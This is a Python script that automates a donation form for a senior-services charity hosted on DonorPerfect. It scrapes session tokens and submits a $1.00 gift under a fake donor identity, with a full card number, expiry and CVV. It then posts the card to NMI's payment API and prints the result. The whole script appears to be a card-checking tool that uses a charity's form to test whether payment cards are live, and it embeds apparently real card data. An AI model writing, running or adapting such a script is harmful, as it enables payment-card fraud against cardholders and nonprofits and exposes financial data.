import requests
import re
r=requests.Session()
headers = {
    'authority': 'seniorservicesalex.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://www.google.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

response = r.get('https://seniorservicesalex.org/donate/', headers=headers)
pattern = r'name=([A-Za-z0-9]+)&amp;id=([0-9]+)'
res = re.search(pattern, response.text)
name=res.group(1)
ids=res.group(2)


headers = {
    'authority': 'wl.donorperfect.net',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://seniorservicesalex.org/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

params = {
    'name': name,
    'id': ids,
}

response = r.get('https://wl.donorperfect.net/weblink/weblink.aspx', params=params, cookies=r.cookies, headers=headers)
pattern = r'name=([A-Za-z0-9]+)&amp;id=([0-9]+)&amp;formid=([0-9]+)'
f = re.search(pattern, response.text)
named = f.group(1)
id_value = f.group(2)
formid = f.group(3)
pattern = r'id="__VIEWSTATE"[^>]*value="([^"]+)"'
state  = re.search(pattern, response.text).group(1)
tor=re.search(r'id="__VIEWSTATEGENERATOR".*?value="([^"]+)"', response.text).group(1)
tim= re.search(r'<input\s+[^>]*name=["\']time["\'][^>]*value=["\']([^"\']+)["\']',response.text).group(1)
cdb=re.search(r'<input\s+[^>]*name=["\']nm_cdb["\'][^>]*value=["\']([^"\']+)["\']',response.text).group(1)
headers = {
    'authority': 'wl.donorperfect.net',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://wl.donorperfect.net',
    'referer': f'https://wl.donorperfect.net/weblink/weblink.aspx?name={named}&id={id_value}',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

params = {
    'name': named,
    'id': id_value,
    'formid': formid,
}

data = {
    '__EVENTTARGET': 'btnConfirm12345',
    '__EVENTARGUMENT': '',
    '__VIEWSTATE': state,
    '__VIEWSTATEGENERATOR': tor,
    'time': tim,
    'hidden_account_type': '',
    'hidden_cardtype': '',
    'hidden_currency': 'USD',
    'hash': '',
    'hidden_dropDownCtrlListSelectedValues': '',
    'merchant_defined_field_1': 'WebLink',
    'merchant_defined_field_2': '',
    'merchant_defined_field_3': '',
    'merchant_defined_field_4': '',
    'merchant_defined_field_5': '',
    'nm_amount': '0.00',
    'nm_cdb': cdb,
    'key_id': '',
    'orderid': '0',
    'nm_redirect': '',
    'nm_selected_account': 'cc',
    'nm_tid': '3',
    'nm_vault_id': '',
    'nm_vault_id_list': '',
    'hidden_returnUrl': '',
    'curSymbol': '$',
    'amount': '',
    'Part|321|giftPledgeAmount|A|Y|giftPledgeAmount:ucOtherAmountRbl': '1.00',
    'Part|321|giftPledgeAmount|A|Y|giftPledgeAmount:ucGPOtherAmountTxt_5': '1.00',
    'Part|321|giftPledgeType||N|giftPledgeType:Part|321|giftPledgeType||N|giftPledgeType': 'OTG',
    'Part|321|giftPledgeFreq||N|giftPledgeFreq:ucDDLGPFreq': 'M|for|0|weeks|weekly',
    'Part|321|giftPledgeFreq||N|giftPledgeFreq:txtGPFreqFor': 'for',
    'Part|321|giftPledgeFreq||N|giftPledgeFreq:txtGPFreqIncrementBy': '0',
    'Part|321|giftPledgeFreq||N|giftPledgeFreq:txtGPFreqIncrementMessage': 'weeks = 0.00 weekly',
    'first_name:ucTxtBox': 'raph',
    'last_name:ucTxtBox': 'raph',
    'opt_line': 'raoh',
    'address:ucTxtBox': 'new york 1000',
    'address2': '',
    'city:ucTxtBox': 'new yotk',
    'state:ucDDL': 'NY|New York|Y',
    'zip:ucTxtBox': '10080',
    'home_phone:ucPhone': '214-728-2828',
    'mobile_phone:ucPhone': '214-627-2917',
    'business_phone:ucPhone': '',
    'email:ucEmail': 'raph@rhp.com',
    'ucRblOptionalContribution': 'Y',
    'CardHolderName': 'raph raph',
    'Cardtype:ucDDL': 'Visa',
    'CardAccountNum:ucNumericTxt': '4377660101041364',
    'ExpirationDate:ucExpirationMonth': '03',
    'ExpirationDate:ucExpirationYear': '27',
    'CVV2:ucNumericTxt': '172',
    'CardHolderAddress:ucTxtBox': 'new york 1000',
    'CardHolderCity': 'new yotk',
    'CardHolderState:ucDDL': 'NY|New York|Y',
    'CardHolderZip:ucTxtBox': '10080',
    'CardHolderEmail:ucEmail': 'raph@rhp.com',
}

response = r.post(
    'https://wl.donorperfect.net/weblink/FormSingleNM.aspx',
    params=params,
    cookies=r.cookies,
    headers=headers,
    data=data,
)

#print(response.text);exit()

headers = {
    'authority': 'secure.nmi.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://wl.donorperfect.net',
    'referer': 'https://wl.donorperfect.net/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

data = {
    'billing-cc-number': '4377660101041364',
    'billing-cc-exp': '0327',
    'billing-cvv': '',
}

response = requests.post('https://secure.nmi.com/api/v2/three-step/540e1b4a', headers=headers, data=data)
print(response.text)